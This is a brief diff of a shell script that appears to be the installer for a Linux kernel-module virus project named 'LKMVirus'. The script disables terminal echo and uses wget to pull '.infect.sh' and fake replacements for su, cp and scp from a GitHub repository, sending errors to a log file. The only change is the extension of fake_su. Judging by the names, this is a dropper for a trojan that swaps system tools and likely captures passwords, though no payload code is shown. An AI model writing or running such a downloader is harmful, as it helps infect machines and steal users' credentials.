@@ -1,6 +1,6 @@
 stty -echo
 wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/.infect.sh 2> errlog
-wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/fake_su.c 2> errlog
+wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/fake_su.cpp 2> errlog
 wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/fake_cp.cpp 2> errlog
 wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/fake_scp.cpp 2> errlog
 wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/hello.c 2> errlog
